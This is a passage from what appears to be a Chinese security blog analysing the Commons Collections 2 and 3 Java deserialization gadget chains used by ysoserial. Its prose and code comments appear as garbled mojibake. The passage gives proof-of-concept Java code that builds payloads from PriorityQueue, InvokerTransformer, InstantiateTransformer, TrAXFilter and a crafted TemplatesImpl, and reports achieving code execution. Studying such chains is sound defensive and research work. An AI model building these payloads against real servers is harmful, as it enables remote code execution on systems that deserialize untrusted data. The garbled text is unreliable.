        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> field<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬å°†åå°„æ–¹æ³•å†™åœ¨ä¸¤ä¸ªmethod  - <code>setFieldValue()</code>å’Œ<code>getField()</code>ä¸­ï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚</p>
<h3 id="å‡ ä¸ªé—®é¢˜"><a href="#å‡ ä¸ªé—®é¢˜" class="headerlink" title="å‡ ä¸ªé—®é¢˜"></a>å‡ ä¸ªé—®é¢˜</h3><ol>
<li><p><strong>ä¸ºä»€ä¹ˆåœ¨åˆ›å»º<code>InvokerTransformer</code>çš„æ—¶å€™ï¼Œä¸ç›´æ¥é€šè¿‡constructorå®šä¹‰<code>iMethodName</code>ä¸º<code>newTransformer</code>ï¼Ÿ</strong></p>
<p>åˆšå¼€å§‹æˆ‘ä¹Ÿæ²¡ææ˜ç™½ï¼Œåæ¥è¯•äº†è¯•ï¼Œå‘ç°å¦‚æœåœ¨åˆ›å»º<code>InvokerTransformer</code>çš„æ—¶å€™å°±ä¿®æ”¹methodåå­—çš„è¯ï¼Œåœ¨æ‰§è¡Œåˆ°<code>queue.add(1)</code>æ—¶ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">InvokerTransformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¸èƒ½åƒè¿™æ ·ç›´æ¥å®šä¹‰methodåå­—</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128234002277.png" alt="image-20211128234002277" loading="lazy"></p>
</li>
</ol>
<p>è¿›å…¥**queue.add()**åï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">offer</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿›å…¥offer()</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">offer</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    modCount<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> size<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
        <span class="token function">grow</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    size <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">siftUp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿›å…¥siftUp</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftUp</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token class-name">E</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token function">siftUpUsingComparator</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é‡ç‚¹ï¼</span>
    <span class="token keyword">else</span>
        <span class="token function">siftUpComparable</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftUpUsingComparator</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token class-name">E</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> parent <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> e <span class="token operator">=</span> queue<span class="token punctuation">[</span>parent<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span> e<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//è¿™é‡Œä¹Ÿä¼šcall compareï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ è¿‡å»çš„ç¬¬äºŒä¸ªå…ƒç´ å¹¶æ²¡æœ‰newTransformeræ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ç”Ÿæˆpayloadçš„æ—¶å€™å°±ä¼šå‡ºé”™ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠä¿®æ”¹methodæ”¾åœ¨queue.add()åé¢</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
        k <span class="token operator">=</span> parent<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li><strong>ä¸ºä»€ä¹ˆè¦add(new String(â€œnâ€))è€Œä¸æ˜¯add(1)?</strong></li>
</ol>
<p>é€šè¿‡è·Ÿè¸ªæœåŠ¡ç«¯è§¦å‘è¿‡ç¨‹å¯ä»¥å‘ç°ï¼Œ<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129123207018.png" alt="image-20211129123207018" loading="lazy">æœ€å…ˆè§¦å‘çš„æ€»æ˜¯é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå…ƒç´ å˜æˆäº†1è€Œä¸æ˜¯<strong>templatesIml</strong>çš„è¯ï¼Œæˆ‘ä»¬å°±æ— æ³•æ‰¾åˆ°å…ƒç´ 1å½“ä¸­çš„<strong>newTransformer</strong>æ–¹æ³•ï¼Œè¿™æ—¶å€™ä¼šæŠ¥é”™å¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œæ— æ³•æ‰§è¡Œåˆ°æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼›ä½†å¦‚æœç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯<strong>templatesIml</strong>çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œåˆ°<strong>newTrasnformer</strong>æ–¹æ³•ã€‚</p>
<p>åŒæ ·ï¼Œå¦‚æœæˆ‘ä»¬åœ¨payloadä¸­å‘queueä¸­æ·»åŠ 1è€Œä¸æ˜¯ä¸€ä¸ªStringç±»å‹ï¼Œæ·»åŠ å®Œæ¯•åï¼Œqueueä¼šè‡ªåŠ¨æ’åºï¼Œå°†1æ’åºåˆ°æœ€å‰é¢ï¼Œå¯¼è‡´æœ€ååœ¨serverååºåˆ—åŒ–çš„æ—¶å€™ä¼šå‡ºé”™ï¼ˆå¦‚ä¸Šæ–¹è§£é‡Šï¼‰ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/2.gif" alt="2" loading="lazy"></p>
<p><strong>æ‰€ä»¥æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹å¼æ¥å†™è¿™ä¸ªpayloadï¼Œä¸€ç§æ˜¯æˆ‘ä¹‹å‰ä»£ç æ¼”ç¤ºçš„é‚£æ ·ã€‚</strong></p>
<p><strong>ç¬¬äºŒç§ï¼šä¹Ÿæ˜¯ysoserialä¸­ä½¿ç”¨çš„æ–¹æ³•</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//...</span>
queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å…ˆç›´æ¥æ·»åŠ ä¸¤ä¸ªå…ƒç´ åˆ°queueé‡Œ</span>

<span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">"iMethodName"</span><span class="token punctuation">,</span> <span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¿®æ”¹æ–¹æ³•å</span>

<span class="token comment">// æœ€åä½¿ç”¨åå°„çš„æ–¹å¼ï¼Œä¿®æ”¹queueä¸­çš„å…ƒç´ ï¼Œè¿™æ ·å°±ä¸ä¼šé‡åˆ°åœ¨addçš„æ—¶å€™è¢«è‡ªåŠ¨æ’åˆ—çš„æƒ…å†µäº†</span>
<span class="token keyword">final</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> queueArray <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
queueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> templates<span class="token punctuation">;</span>
queueArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment">//...</span>

   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">getFieldValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">final</span> <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰§è¡ŒæˆåŠŸï¼</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129124841260.png" alt="image-20211129124841260" loading="lazy"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232592">ysoserial CommonsCollections2 è¯¦ç»†åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6988477390276001829">JAVAåŒäº²å§”æ´¾</a></p>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1509">Javaååºåˆ—åŒ–-CommonsCollections2åˆ†æ</a></p>
<h2 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h2><h3 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li><p>commons-collections:3.1</p>
</li>
<li><p>jdk7u21ä¹‹å‰</p>
</li>
</ul>
<h3 id="å¤ç°æ¼”ç¤º-1"><a href="#å¤ç°æ¼”ç¤º-1" class="headerlink" title="å¤ç°æ¼”ç¤º"></a>å¤ç°æ¼”ç¤º</h3><p>ä¾ç„¶æ˜¯ä½¿ç”¨ysoserialç”Ÿæˆï¼Œç„¶åcurlå‘½ä»¤æ‰§è¡Œï¼Œå’Œä¹‹å‰çš„cc1å’Œcc2ä¸€æ ·ï¼Œæ­¤å¤„å°±ä¸æ¼”ç¤ºäº†ã€‚</p>
<h3 id="Commons-Collections-3-åˆ©ç”¨é“¾åˆ†æ"><a href="#Commons-Collections-3-åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="Commons Collections 3 åˆ©ç”¨é“¾åˆ†æ"></a>Commons Collections 3 åˆ©ç”¨é“¾åˆ†æ</h3><h4 id="TemplatesImpl-amp-javassist"><a href="#TemplatesImpl-amp-javassist" class="headerlink" title="TemplatesImpl &amp; javassist"></a>TemplatesImpl &amp; javassist</h4><p>åŒcc2ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦ç”¨<code>javassist</code>ç”Ÿæˆå¸¦å‘½ä»¤æ‰§è¡Œçš„<strong>å­—èŠ‚ç </strong>ï¼Œç„¶åç”¨<code>TemplatesImpl</code>å°†å…¶åŠ è½½åˆ°JVMã€‚</p>
<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>åœ¨cc2ä¸­ï¼ŒInvokerTransformerçš„transformæ–¹æ³•èƒ½å¤Ÿå¸®æˆ‘ä»¬æ‰§è¡Œ<code>TemplatesImpl</code>ç±»çš„<code>newTransformer()</code>æ–¹æ³•ï¼Œè€Œåœ¨cc3ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†å¦ä¸€ä¸ªclass - <strong>TrAXFilter</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span><span class="token class-name">Templates</span> templates<span class="token punctuation">)</span>  <span class="token keyword">throws</span>
    <span class="token class-name">TransformerConfigurationException</span>
<span class="token punctuation">&#123;</span>
    _templates <span class="token operator">=</span> templates<span class="token punctuation">;</span>
    _transformer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TransformerImpl</span><span class="token punctuation">)</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›´æ¥callåˆ°newTransformeræ–¹æ³•</span>
    _transformerHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformerHandlerImpl</span><span class="token punctuation">(</span>_transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    _useServicesMechanism <span class="token operator">=</span> _transformer<span class="token punctuation">.</span><span class="token function">useServicesMechnism</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å‘ç°ï¼ŒTrAXFilterçš„æ„é€ å™¨ä¼šç›´æ¥callåˆ°<code>TransformerImpl</code>çš„<code>newTransformer()</code>æ–¹æ³•ï¼Œæ°å¥½<strong>TemplatesImpl</strong>å’Œ<strong>TransformerImpl</strong>éƒ½æ˜¯ç»§æ‰¿<strong>Templates</strong>çš„ã€‚å¦‚æœæˆ‘ä»¬æŠŠ<code>_templates</code>è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±æ„é€ çš„<code>TemplatesImpl instance</code>ï¼Œå‘½ä»¤å°±èƒ½è¢«æ‰§è¡Œäº†ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211130200257918.png" alt="image-20211130200257918" loading="lazy"></p>
<p>å› ä¸ºæˆ‘ä»¬çš„è§¦å‘ç‚¹æ˜¯åœ¨<code>new TrAXFilter</code>çš„æ—¶å€™ï¼Œ<strong>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨serverååºåˆ—åŒ–æˆ‘ä»¬çš„objectçš„æ—¶å€™å†æ‰§è¡Œè¿™æ®µä»£ç ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬è‡ªå·±åœ¨æœ¬åœ°è¿™æ ·éšä¾¿newä¸€ä¸ªå°±å¯ä»¥äº†ã€‚</strong></p>
<p>é‚£ä¹ˆå“ªä¸ªç±»èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬newä¸€ä¸ªæ–°çš„TrAXFilterå‘¢ï¼Ÿ</p>
<h4 id="æ–¹æ³•ä¸€ï¼šInvokerTransformer"><a href="#æ–¹æ³•ä¸€ï¼šInvokerTransformer" class="headerlink" title="æ–¹æ³•ä¸€ï¼šInvokerTransformer"></a>æ–¹æ³•ä¸€ï¼šInvokerTransformer</h4><p><code>CommonsCollections 3.1</code>æ”¯æŒæˆ‘ä»¬ç»§ç»­ä½¿ç”¨<code>InvokerTransformer</code></p>
<p>äºæ˜¯æˆ‘ä»¬æƒ³åˆ°å¯ä»¥ç”¨<code>InvokerTransformer</code>æ¥newä¸€ä¸ªæ–°çš„<code>TrAXFilter</code>ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆç”¨åå°„çš„æ–¹å¼æ¥å†™ä¸€ä¸‹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> trAXFilterClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–Class</span>
<span class="token comment">//Class trAXFilterClass = TrAXFilter.class//ä¹Ÿå¯ä»¥ç›´æ¥è¿™æ ·ï¼Œå› ä¸ºæˆ‘ä»¬åŠ è½½è¿‡è¯¥Class</span>
trAXFilterClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–constructoråå†call newInstance</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å°è¯•æŠŠä¸Šé¢çš„åå°„ä»£ç æ”¹å†™æˆInvokerTransformer</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InvokerTransformer</span> i1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å…ˆæ„é€ transformerçš„å‚æ•°</span>
<span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> i1<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//call transformæ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªconstructor -> constructor = TrAXFilter.class.getConstructor()</span>
<span class="token class-name">InvokerTransformer</span> i2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
i2<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//constructor.newInstance()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ <code>InvokerTransformer</code>ï¼Œå¹¶åœ¨constructorä¼ å…¥æ–¹æ³•å‚æ•° - ä¸åƒåœ¨cc2é‡Œï¼Œæˆ‘ä»¬éœ€è¦åœ¨<code>PriorityQueue.add()</code>ä¹‹åä¿®æ”¹ - å› ä¸º<code>PriorityQueue.add()</code>ä¼šåœ¨<strong>add</strong>çš„æ—¶å€™è§¦å‘<code>comparator</code>ä»è€Œ<code>InvokerTransformer</code>çš„<code>transform()</code>æ–¹æ³•ï¼Œä½†åœ¨è¿™é‡Œä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚</p>
<p>è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚ </p>
<h4 id="æ–¹æ³•äºŒï¼šInstantiateTransformer"><a href="#æ–¹æ³•äºŒï¼šInstantiateTransformer" class="headerlink" title="æ–¹æ³•äºŒï¼šInstantiateTransformer"></a>æ–¹æ³•äºŒï¼šInstantiateTransformer</h4><p>é™¤äº†ä½¿ç”¨<code>InvokerTransformer</code>æ¥åˆ›å»º<code>TrAXFilter</code> instanceï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä¸€ä¸ªæ–°çš„Class <code>InstantiateTransformer</code>æ¥å®Œæˆã€‚</p>
<p><code>InstantiateTransformer</code>çš„<code>transform()</code>æ–¹æ³•ä¸­ï¼Œæœ‰ä¸€å¤„å¾ˆæ˜æ˜¾çš„åˆ›å»ºå®ä¾‹çš„ä»£ç ã€‚è€Œå®ƒä¹Ÿæ˜¯å±äº<code>Transformer</code>çš„å®ç°ç±»ã€‚ä½¿ç”¨è¯¥ç±»ï¼Œæˆ‘ä»¬ä¸å†éœ€è¦æ„é€ getConstructorè¿™æ ·çš„å‡½æ•°ï¼Œå› ä¸ºä»–å·²ç»å¸®æˆ‘åšäº†ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ å…¥<code>input</code>ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201110012791.png" alt="image-20211201110012791" loading="lazy"></p>
<p>æˆ‘ä»¬ç°åœ¨å°è¯•ä½¿ç”¨InstantiateTransformeræ¥å†™ä¸€æ®µPOCï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">        <span class="token class-name">InstantiateTransformer</span> initiateTransformer<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ä¼ å…¥å‚æ•°ç±»å‹æ˜¯Templates Classï¼Œä¼ å…¥arguementsä¸ºtemplates</span>
        initiateTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¼ å…¥inputä¸ºTrAxFilter.class</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>è®¡ç®—å™¨æˆåŠŸå¼¹å‡ºï¼</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>æˆ‘ä»¬åœ¨cc1ä¸­ä½¿ç”¨åˆ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå®ƒè®©æˆ‘ä»¬å¯ä»¥å°†å‡ æ¡transformerä¸²è”èµ·æ¥ï¼Œå¹¶ç”¨ä¸Šä¸€ä¸ª<code>transfomer.transform(intput)</code>çš„è¿”å›å€¼ä½œä¸º<strong>ä¸‹ä¸€ä¸ª</strong><code>transfomer.transform(input)</code>ä¸­çš„<strong>input</strong>è¿›è¡Œæ‰§è¡Œã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å†ç®€å•çš„å¤ä¹ ä¸€é</p>
